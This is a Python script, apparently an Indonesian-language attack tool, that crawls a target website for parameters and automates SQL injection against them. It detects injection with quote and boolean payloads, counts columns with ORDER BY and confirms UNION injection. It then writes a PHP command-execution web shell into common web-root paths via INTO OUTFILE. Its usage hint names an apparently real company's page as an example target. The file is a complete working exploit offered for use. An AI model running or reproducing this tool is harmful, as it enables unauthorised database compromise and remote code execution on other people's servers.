#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# --[MAI]--
# Author: JunedXsec
# Inspired By: sqlmap, muani injection tools, psql-pro
# Version: 4.0 (2026) - Professional Release

import sys
import os
import re
import time
import random
import urllib.parse
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import OrderedDict

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ==================== KONFIGURASI ====================
TIMEOUT = 15
DELAY = 0.5
MAX_THREADS = 3
MAX_COLUMNS = 30
RETRY_COUNT = 2

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
]

# Warna ANSI
C = {
    'INFO': '\033[92m',
    'ERROR': '\033[91m',
    'SUCCESS': '\033[94m',
    'WARNING': '\033[93m',
    'RESET': '\033[0m',
    'BOLD': '\033[1m',
    'CYAN': '\033[96m'
}

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def log_info(msg): print(f"{C['INFO']}[INFO]{C['RESET']} {msg}")
def log_error(msg): print(f"{C['ERROR']}[ERROR]{C['RESET']} {msg}")
def log_success(msg): print(f"{C['SUCCESS']}[SUCCESS]{C['RESET']} {msg}")
def log_warning(msg): print(f"{C['WARNING']}[WARNING]{C['RESET']} {msg}")
def log_banner():
    print(f"{C['BOLD']}{C['CYAN']}--[MAI]--{C['RESET']}")
    print(f"{C['BOLD']}Author: JunedXsec{C['RESET']}")
    print(f"Inspired By: sqlmap, muani injection tools, psql-pro")
    print()

# ==================== HTTP HELPER ====================
session = requests.Session()
session.verify = False

def fetch(url, params=None, post_data=None, retry=RETRY_COUNT):
    time.sleep(DELAY)
    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    for attempt in range(retry):
        try:
            if params:
                resp = session.get(url, params=params, timeout=TIMEOUT, allow_redirects=True)
            elif post_data:
                resp = session.post(url, data=post_data, timeout=TIMEOUT, allow_redirects=True)
            else:
                resp = session.get(url, timeout=TIMEOUT, allow_redirects=True)
            resp.encoding = 'utf-8'
            return resp
        except Exception as e:
            if attempt == retry-1:
                log_error(f"Request failed: {str(e)[:60]}")
                return None
            time.sleep(1)
    return None

# ==================== CRAWLER (Discover Parameters) ====================
class SmartParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.links = []      # semua URL
        self.forms = []      # (action, method, inputs)
        self.params_found = set()
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'a' and 'href' in attrs:
            href = attrs['href']
            full = urllib.parse.urljoin(self.base_url, href)
            self.links.append(full)
            # cek apakah URL memiliki parameter
            if '?' in full:
                parsed = urllib.parse.urlparse(full)
                if parsed.query:
                    for key in urllib.parse.parse_qs(parsed.query).keys():
                        self.params_found.add(key)
        elif tag == 'form':
            action = attrs.get('action', '')
            method = attrs.get('method', 'get').lower()
            full_action = urllib.parse.urljoin(self.base_url, action)
            self.forms.append([full_action, method, []])
        elif tag == 'input' and self.forms:
            name = attrs.get('name')
            if name:
                self.forms[-1][2].append(name)

def extract_params_from_url(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.query:
        return {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
    return {}

def discover_endpoints(target):
    """Crawling halaman utama + follow link sampai depth 1"""
    log_info(f"Memulai Scanning SQLi Vuln Ke Site: {target}")
    resp = fetch(target)
    if not resp or resp.status_code != 200:
        log_error("Gagal mengakses website")
        return [], []
    parser = SmartParser(target)
    parser.feed(resp.text)
    
    # Kumpulkan semua endpoint GET dari link yang ditemukan
    get_endpoints = []
    seen_urls = set()
    for link in parser.links:
        params = extract_params_from_url(link)
        if params and link not in seen_urls:
            seen_urls.add(link)
            get_endpoints.append((link, params))
    # Tambahkan juga URL target asli jika memiliki parameter
    orig_params = extract_params_from_url(target)
    if orig_params and target not in seen_urls:
        get_endpoints.insert(0, (target, orig_params))
    
    # Form POST
    post_forms = [(action, method, inputs) for action, method, inputs in parser.forms if method == 'post' and inputs]
    
    log_info(f"Ditemukan {len(get_endpoints)} URL dengan parameter")
    if parser.params_found:
        log_info(f"Nama parameter yang ditemukan: {', '.join(list(parser.params_found)[:5])}")
    return get_endpoints, post_forms

# ==================== INJECTION DETECTION ====================
def test_injection(url, param, orig_value, original_content):
    log_info("Mencari Metode Injection Di Website string_based/numeric_based")
    # Test single quote
    test_payload = "'"
    log_info(f"Menggunakan Payload: {urllib.parse.quote(test_payload)}")
    params = {param: f"{orig_value}{test_payload}"}
    resp = fetch(url, params=params)
    if resp and resp.status_code == 200 and resp.text != original_content:
        log_info("tipeinjeksi Menggunakan Metode String Based")
        return "string", "'"
    # Test numeric
    test_payload2 = " AND 1=2"
    params2 = {param: f"{orig_value}{test_payload2}"}
    resp2 = fetch(url, params=params2)
    if resp2 and resp2.status_code == 200 and resp2.text != original_content:
        log_info("tipeinjeksi Menggunakan Metode Numeric Based")
        return "numeric", ""
    # Test boolean blind
    true_payload = f"{orig_value}' AND '1'='1"
    false_payload = f"{orig_value}' AND '1'='2"
    r_true = fetch(url, params={param: true_payload})
    r_false = fetch(url, params={param: false_payload})
    if r_true and r_false and r_true.text != r_false.text:
        log_info("tipeinjeksi Menggunakan Metode Boolean Blind")
        return "boolean", "' AND '1'='1"
    return None, None

def count_columns(url, param, original_value, inj_type, trigger):
    log_info("Mencari Column...")
    for cols in range(1, MAX_COLUMNS+1):
        if inj_type == "string":
            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
        else:
            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
        params = {param: payload}
        resp = fetch(url, params=params)
        if not resp:
            continue
        if "Unknown column" in resp.text or "error" in resp.text.lower():
            log_info(f"Menghitung Order By: {cols-1}")
            return cols-1
    log_info(f"Menghitung Order By: {MAX_COLUMNS}")
    return MAX_COLUMNS

def union_extract(url, param, original_value, inj_type, trigger, num_cols):
    markers = ','.join([str(i*11) for i in range(1, num_cols+1)])
    if inj_type == "string":
        payload = f"{original_value}{trigger} AND 0 UNION SELECT {markers}-- -"
    else:
        payload = f"{original_value}{trigger} AND 0 UNION SELECT {markers}-- -"
    log_info(f"Mencoba Payload: {payload[:80]}...")
    params = {param: payload}
    resp = fetch(url, params=params)
    if resp and resp.status_code == 200:
        found = re.findall(r'\b(11|22|33|44|55|66|77|88|99|110|121|132|143|154|165|176|187|198|209|220)\b', resp.text)
        if found:
            visible = list(OrderedDict.fromkeys(found))
            log_info(f"Angka Yang Muncul: {', '.join(visible)}")
            payload_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            log_info(f"Payload Union: {payload_url}")
            return True
    return False

def upload_dios(url, param, original_value, inj_type, trigger, num_cols):
    log_info("Mengupload dios...")
    shell_content = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
    paths = [
        "/var/www/html/shell.php",
        "/var/www/shell.php",
        "/home/public_html/shell.php",
        "/tmp/shell.php",
        "C:/xampp/htdocs/shell.php",
        "C:/inetpub/wwwroot/shell.php"
    ]
    for out_path in paths:
        nulls = ['NULL'] * num_cols
        nulls[0] = f"'{shell_content}'"
        if inj_type == "string":
            payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{out_path}'-- -"
        else:
            payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{out_path}'-- -"
        params = {param: payload}
        resp = fetch(url, params=params)
        log_info("Mengecek Output respon")
        if resp and "error" not in resp.text.lower():
            log_info("Output Berhasil Di Periksa")
            log_success(f"Dios: {url}?{param}={urllib.parse.quote(payload)}")
            log_success(f"Webshell uploaded to {out_path}")
            log_warning(f"Akses: {out_path}?cmd=id")
            return True
    log_error("Gagal mengupload dios (periksa hak FILE MySQL)")
    return False

def scan_endpoint(url, params_dict):
    for param, orig_val in params_dict.items():
        log_info(f"Mencari Parameter Pada Url...")
        log_info("Url Memiliki Parameter")
        orig_resp = fetch(url)
        if not orig_resp:
            continue
        original_content = orig_resp.text
        log_info("Berhasil Mengambil Konten Default Pada Website")
        inj_type, trigger = test_injection(url, param, orig_val, original_content)
        if not inj_type:
            continue
        num_cols = count_columns(url, param, orig_val, inj_type, trigger)
        if num_cols < 1:
            continue
        log_info(f"Jumlah Column: {num_cols}")
        if union_extract(url, param, orig_val, inj_type, trigger, num_cols):
            upload_dios(url, param, orig_val, inj_type, trigger, num_cols)
        break

# ==================== MAIN ====================
def main():
    clear_screen()
    log_banner()
    raw_target = input(f"{C['BOLD']}Masukkan URL target (contoh: https://example.com/page.php?id=1){C['RESET']}\n> ").strip()
    if not raw_target:
        log_error("URL tidak boleh kosong")
        sys.exit(1)
    # Bersihkan URL: hapus karakter aneh, pastikan format
    target = raw_target.split()[0]  # ambil kata pertama jika ada spasi
    if not target.startswith(('http://','https://')):
        target = 'http://' + target
    # Validasi sederhana
    if target.endswith(')'):
        target = target[:-1]
    
    get_endpoints, post_forms = discover_endpoints(target)
    if not get_endpoints and not post_forms:
        log_error("Tidak ditemukan parameter GET atau form POST.")
        log_warning("Contoh URL yang memiliki parameter: https://www.baizidsteel.com.bd/news.php?id=23")
        sys.exit(1)
    
    log_info(f"Memulai scan pada {len(get_endpoints)} endpoint GET")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(scan_endpoint, url, params) for url, params in get_endpoints]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                log_error(f"Thread error: {e}")
    
    for action, method, inputs in post_forms:
        log_info(f"Mencoba POST form: {action}")
        for field in inputs[:2]:
            test_data = {field: "'"}
            resp = fetch(action, post_data=test_data)
            if resp and ("mysql" in resp.text.lower() or "error" in resp.text.lower()):
                log_success(f"Potensi SQLi POST pada field {field} di {action}")
    
    log_success("Scan selesai.")

if __name__ == "__main__":
    main()
